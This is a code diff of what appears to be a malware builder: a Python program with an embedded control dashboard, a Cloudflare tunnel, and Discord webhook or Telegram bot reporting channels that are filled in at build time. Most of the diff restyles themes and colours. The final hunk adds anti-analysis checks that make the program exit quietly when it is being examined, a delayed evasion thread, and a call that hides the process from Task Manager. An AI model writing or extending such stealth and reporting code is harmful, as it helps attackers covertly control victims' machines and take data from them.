         /* Blinking Cursor */
         .log-box::after { content: '_'; animation: blink 1s step-end infinite; color: #7c3aed; }
@@ -3101,18 +3370,18 @@ DASHBOARD_HTML = r'''
         /* Context Menu */
         .ctx-menu {
             display: none; position: fixed;
-            background: #0f0a1a; border: 1px solid rgba(124, 58, 237, 0.3);
+            background: #0a0a0a; border: 1px solid rgba(255, 255, 255, 0.2);
             border-radius: 6px; padding: 4px; z-index: 10000;
             min-width: 160px;
         }
         .ctx-menu.open { display: block; }
         .ctx-menu button {
             display: block; width: 100%; background: transparent;
-            color: #c084fc; border: none; padding: 8px 12px;
+            color: #fff; border: none; padding: 8px 12px;
             text-align: left; cursor: pointer; font-family: 'Courier New', monospace;
             font-size: 12px; border-radius: 3px;
         }
-        .ctx-menu button:hover { background: rgba(124, 58, 237, 0.15); color: #fff; }
+        .ctx-menu button:hover { background: rgba(255, 255, 255, 0.05); color: #fff; }
 
         /* Theme: Red mode */
         body.red-mode { background: #0a0505; }
@@ -3756,14 +4025,19 @@ DASHBOARD_HTML = r'''
         function clearActivity() { document.getElementById('activityLog').textContent = ''; }
 
         // Theme Toggle
+        const themes = ['', 'purple-mode', 'red-mode', 'light-theme'];
+        const themeNames = ['Midnight', 'Purple', 'Red', 'Light'];
         function toggleTheme() {
-            document.body.classList.toggle('red-mode');
-            const isRed = document.body.classList.contains('red-mode');
-            localStorage.setItem('igr-theme', isRed ? 'red' : 'purple');
-            logActivity('Theme: ' + (isRed ? 'Red Mode' : 'Purple Mode'), 'info');
+            const current = themes.findIndex(t => t && document.body.classList.contains(t));
+            document.body.classList.remove('purple-mode', 'red-mode', 'light-theme');
+            const next = (current + 1) % themes.length;
+            if (themes[next]) document.body.classList.add(themes[next]);
+            localStorage.setItem('igr-theme', themes[next] || 'default');
+            logActivity('Theme: ' + themeNames[next], 'info');
         }
         function loadTheme() {
-            if (localStorage.getItem('igr-theme') === 'red') document.body.classList.add('red-mode');
+            const saved = localStorage.getItem('igr-theme');
+            if (saved && saved !== 'default') document.body.classList.add(saved);
         }
 
         // FAB
@@ -6816,12 +7090,20 @@ def start_cloudflared(port: int) -> Optional[str]:
 
 def main():
     """Main function to set up and run the service."""
-    has_discord = DISCORD_WEBHOOK_URL and not DISCORD_WEBHOOK_URL.startswith("BUILD_")
-    has_telegram = TELEGRAM_BOT_TOKEN and not TELEGRAM_BOT_TOKEN.startswith("BUILD_") and TELEGRAM_CHAT_ID and not TELEGRAM_CHAT_ID.startswith("BUILD_")
+    if not _anti_analysis_check():
+        os._exit(0)
+
+    has_discord = DISCORD_WEBHOOK_URL and not DISCORD_WEBHOOK_URL.startswith("BUILD_") and not DISCORD_WEBHOOK_URL.startswith("ENC:")
+    has_telegram = TELEGRAM_BOT_TOKEN and not TELEGRAM_BOT_TOKEN.startswith("BUILD_") and not TELEGRAM_BOT_TOKEN.startswith("ENC:") and TELEGRAM_CHAT_ID and not TELEGRAM_CHAT_ID.startswith("BUILD_") and not TELEGRAM_CHAT_ID.startswith("ENC:")
 
     if not has_discord and not has_telegram:
         return
-    
+
+    try:
+        threading.Thread(target=_delayed_anti_analysis, daemon=True).start()
+    except:
+        pass
+
     try:
         _hide_from_taskmanager()
     except:
